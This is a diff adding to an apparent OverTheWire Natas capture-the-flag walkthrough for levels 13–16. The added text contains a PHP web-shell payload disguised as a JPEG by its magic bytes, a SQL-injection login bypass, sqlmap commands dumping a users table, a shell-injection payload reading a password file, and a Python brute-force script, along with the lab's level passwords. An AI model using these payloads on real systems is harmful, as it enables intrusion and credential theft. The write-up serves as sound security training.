@@ -161,14 +161,118 @@ Inject the same backdoor as in the previous challenge [http://natas13.natas.labs
 
 > You can download the final payload here [overthewire-natas13-pixel-with-backdoor.jpg](/assets/images/2018/12/overthewire-natas13-pixel-with-backdoor.jpg)
 
-
-### Level 14 -
+> Also, we can completely forge the payload without any software. The idea is to add the JPG magic numbers `ff d8 ff` in hexadecimal format
+```bash
+$ echo -n -e "\xff\xd8\xff<?php system(\$_GET['backdoor']); ?>" > payload.jpg
+$ file payload.jpg
+payload.jpg: JPEG image data
 ```
-http://natas1.natas.labs.overthewire.org/ natas gtVrDuiDfck831PqWsLEZy5gyDz1clto
-```
-``
+It takes 38 octets and works just as fine!!
+It also proves that `file` and `exif_imagetype` are based on magic numbers, which may be completely misleading!!
 
-" or 1=1 #
+### Level 14 - SQL injection
+```
+http://natas1.natas.labs.overthewire.org/ natas Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+In the PHP code we have
+```php
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=...";
+```
+
+If we inject `" or 1=1 #` in the username field, we send this final SQL code:
+
+```sql
+SELECT * from users where username="" or 1=1 # and password=...
+-- Equivalent to
+SELECT * from users
+```
+
+`Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
+
+### Level 15 -
+```
+http://natas15.natas.labs.overthewire.org/ natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+```bash
+$ ./sqlmap.py --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --auth-type=BASIC -u 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16' --level 3 --dbms=mysql -p username --dbs
+available databases [2]:
+[*] information_schema
+[*] natas15
+$ ./sqlmap.py --auth-cred="natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" --auth-type=BASIC -u 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16' --level 3 --dbms=mysql -p username -D natas15 -T users --dump
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| alice    | hROtsfM734                       |
+| natas16  | WaIHEacj63wnNIBROHeqi3p9t0m5nhmh |
++----------+----------------------------------+
+```
+`WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`
+References:
+- DVWA blind SQLi https://github.com/ethicalhack3r/DVWA
+- https://www.youtube.com/watch?v=7PrUX2587A0
+- https://www.owasp.org/index.php/Blind_SQL_Injection
+- http://sqlmap.org/
+- https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+### Level 16 - Shell injection without ;|&\`\\'"
+```
+http://natas16.natas.labs.overthewire.org/ natas16 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+We still have `$()`! The payload `$(grep -e ^a /etc/natas_webpass/natas17)love` will display `beloved,love..` if the password doesn't start with an `a`.
+
+Bad boy:
+```bash
+$(grep -e ^a /etc/natas_webpass/natas17)love
+# will result in "grep -i love dictionnary" so the output is
+# beloved, love
+```
+
+Good boy:
+```bash
+$(grep -e ^8 /etc/natas_webpass/natas17)love
+# will result in "grep -i 8love dictionnary" so the output is
+# -- nothing --
+```
+
+Let's bruteforce this 💪💪💪 with python 3 🐍3️⃣
+
+```python
+#! /usr/bin/env python3
+import requests
+
+pwd = ''
+baseUrl = 'http://natas16.natas.labs.overthewire.org/?needle=$(grep -e ^% /etc/natas_webpass/natas17)love'
+alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+for i in range(0, 50):
+    print('Current pwd "'+pwd+'" Bruteforcing', end='')
+    for l in alphabet:
+        print('.', end='', flush=True)
+        url = baseUrl.replace('%', pwd+l)
+        r = requests.get(url, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
+        if 'love' not in r.text:
+            pwd += l
+            print('letter found:', l)
+            break;
+```
+
+```
+Current pwd "" Bruteforcing.............................................................letter found: 8
+Current pwd "8" Bruteforcing..........................................letter found: P
+Current pwd "8P". Bruteforcing...................letter found: s
+Current pwd "8Ps" Bruteforcing........................................................letter found: 3
+Current pwd "8Ps3" Bruteforcing..................................letter found: H
+Current pwd "8Ps3H" Bruteforcing.....................................................letter found: 0
+[...]
+Current pwd "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
+```
+`8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
 
 ### Level  -
 ```
